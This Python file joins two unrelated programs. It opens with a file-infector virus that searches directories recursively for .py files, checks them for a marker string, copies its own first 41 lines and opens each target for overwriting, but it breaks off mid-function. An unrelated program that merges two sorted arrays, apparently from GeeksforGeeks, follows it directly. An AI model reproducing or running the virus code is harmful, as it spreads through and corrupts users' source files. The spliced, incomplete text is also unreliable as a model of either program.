#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python program to merge
# two sorted arrays
# with O(1) extra space.
 
# Merge ar1[] and ar2[]
# with O(1) extra space
def merge(ar1, ar2, m, n):
 
    # Iterate through all
    # elements of ar2[] starting from
    # the last element
    for i in range(n-1, -1, -1):
     
        # Find the smallest element
        # greater than ar2[i]. Move all
        # elements one position ahead
        # till the smallest greater
        # element is not found
        last = ar1[m-1]
        j=m-2
        while(j >= 0 and ar1[j] > ar2[i]):
            ar1[j+1] = ar1[j]
            j-=1
  
        # If there was a greater element
        if (last > ar2[i]):
         
            ar1[j+1] = ar2[i]
            ar2[i] = last
  
# Driver program
 
ar1 = [1, 5, 9, 10, 15, 20]
ar2 = [2, 3, 8, 13]
m = len(ar1)
n = len(ar2)
 
merge(ar1, ar2, m, n)
  
print("After Merging \nFirst Array:", end="")
for i in range(m):
    print(ar1[i] , " ", end="")
 
print("\nSecond Array: ", end="")
for i in range(n):
    print(ar2[i] , " ", end="")
 
# This code is contributed
# by Anant Agarwal.
# Time complexity: The worst-case time compelxity of code/algorithm is O(m*n). The worst case occurs when all elements of ar1[] are greater than all elements of ar2[]